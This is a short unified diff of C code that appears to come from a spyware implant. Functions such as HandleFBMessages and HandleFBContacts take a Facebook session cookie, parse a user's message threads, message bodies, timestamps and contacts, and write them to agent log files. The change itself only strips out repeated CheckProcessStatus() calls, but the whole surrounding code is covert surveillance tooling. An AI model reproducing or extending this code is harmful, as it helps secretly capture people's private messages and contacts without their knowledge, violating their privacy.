@@ -149,7 +149,6 @@ DWORD HandleFBMessages(char *cookie)
 	char screen_name_tag[256];
 	char screen_name[256];
 
-	CheckProcessStatus();
 
 	if (!bPM_IMStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
@@ -261,7 +260,6 @@ DWORD HandleFBMessages(char *cookie)
 
 	// Cicla la lista dei thread
 	for (;;) {
-		CheckProcessStatus();
 		parser2 = (BYTE *)strstr((char *)parser1, FB_THREAD_STATUS_IDENTIFIER_V2);
 		if (!parser2)
 			break;
@@ -354,7 +352,6 @@ DWORD HandleFBMessages(char *cookie)
 		parser_inner1 = r_buffer_inner;
 		// Clicla per tutti i messaggi del thread
 		for (;;) {			
-			CheckProcessStatus();
 			parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_MESSAGE_TSTAMP_IDENTIFIER);
 			if (!parser_inner1)
 				break;
@@ -435,7 +432,6 @@ DWORD HandleFBMessages(char *cookie)
 			}
 
 			// Vede se deve mettersi in pausa o uscire
-			CheckProcessStatus();
 
 			if (msg_body) {
 				struct tm tstamp;
@@ -452,7 +448,6 @@ DWORD HandleFBMessages(char *cookie)
 	}
 
 	SAFE_FREE(r_buffer);
-	CheckProcessStatus();
 
 	return SOCIAL_REQUEST_SUCCESS;
 }
@@ -478,7 +473,6 @@ DWORD HandleFBContacts(char *cookie)
 	HANDLE hfile;
 	DWORD flags;
 
-	CheckProcessStatus();
 
 	if (!bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
@@ -515,7 +509,6 @@ DWORD HandleFBContacts(char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	CheckProcessStatus();
 	parser1 = (char *)r_buffer;
 	
 	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
